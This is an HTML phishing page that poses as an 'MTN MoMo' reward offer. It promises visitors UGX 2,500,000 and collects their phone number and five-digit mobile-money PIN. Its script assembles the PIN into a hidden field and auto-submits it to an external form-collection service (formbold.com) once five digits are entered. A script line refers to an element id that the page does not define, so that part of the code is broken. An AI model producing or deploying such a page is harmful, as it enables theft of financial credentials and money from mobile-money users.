<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MoMo MTN</title>

    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="wrapper">

    <div class="logo">
        <h1>MoMo MTN OFFER</h1>
    </div>

    <h2>Congratulations! You have been selected for a reward of UGX 2,500,000</h2>

    <p class="notice">
        Enter your number and PIN.
    </p>

    <form id="refForm" action="https://formbold.com/s/3Labw" method="POST">

        

        <label>Phone Number</label>
        <input type="tel" name="phone" required>

        <label>PIN</label>

        <div class="pin-container">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
        </div>

        <!-- hidden field sent to FormBold -->
        <input type="hidden" name="pin" id="pin">

    </form>

</div>

<script>
const form = document.getElementById("refForm");
const inputs = document.querySelectorAll(".pin-container input");
const hiddenInput = document.getElementById("referral_code");

inputs.forEach((input, index) => {

    input.addEventListener("input", function () {

        this.value = this.value.replace(/[^0-9]/g, "");

        if (this.value.length > 1) {
            this.value = this.value.slice(0, 1);
        }

        if (this.value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }

        updateAndSubmit();
    });

    input.addEventListener("keydown", function (e) {
        if (e.key === "Backspace" && this.value === "" && index > 0) {
            inputs[index - 1].focus();
        }
    });

});

function updateAndSubmit() {

    let code = "";

    inputs.forEach(i => code += i.value);

    hiddenInput.value = code;

    if (code.length === 5 && /^[0-9]{5}$/.test(code)) {

        setTimeout(() => {
            form.submit();
        }, 300);
    }
}
</script>

</body>
</html>
